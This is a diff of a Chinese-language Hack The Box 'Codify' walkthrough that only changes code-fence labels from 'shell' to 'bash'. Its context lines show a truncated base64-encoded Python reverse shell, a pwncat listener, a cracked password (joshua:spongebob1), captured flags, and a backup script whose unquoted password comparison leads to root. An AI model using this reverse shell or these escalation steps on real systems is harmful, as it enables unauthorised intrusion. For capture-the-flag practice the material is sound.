@@ -102,7 +102,7 @@ cmd = 'echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNv
 
 ## User - svc
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [10:36:41] Welcome to pwncat 🐈!
@@ -125,7 +125,7 @@ svc
 
 对哈希数据进行爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ hashid hash.txt
 --File 'hash.txt'--
@@ -154,7 +154,7 @@ joshua:spongebob1
 
 ## User - joshua
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs joshua@10.10.11.239
 [10:52:20] Welcome to pwncat 🐈!
@@ -167,7 +167,7 @@ joshua
 
 ### flag - user
 
-```shell
+```bash
 (remote) joshua@codify:/home/joshua$ cat user.txt
 a32a183123439045d5ea11c8c79e6649
 ```
@@ -184,7 +184,7 @@ User joshua may run the following commands on codify:
 
 查看脚本内容
 
-```shell
+```bash
 #!/bin/bash
 DB_USER="root"
 DB_PASS=$(/usr/bin/cat /root/.creds)
@@ -218,7 +218,7 @@ done
 
 在其中看到
 
-```shell
+```bash
 if [[$DB_PASS == $USER_PASS]]; then
         /usr/bin/echo "Password confirmed!"
 else
@@ -256,7 +256,7 @@ while not is_password_found:
 
 ## User - root
 
-```shell
+```bash
 (remote) joshua@codify:/home/joshua$ su root
 Password:
 root@codify:/home/joshua# whoami
@@ -265,7 +265,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@codify:~# cat root.txt
 f2138d1d7e9e92e46c08a57ad2c6754f
 ```
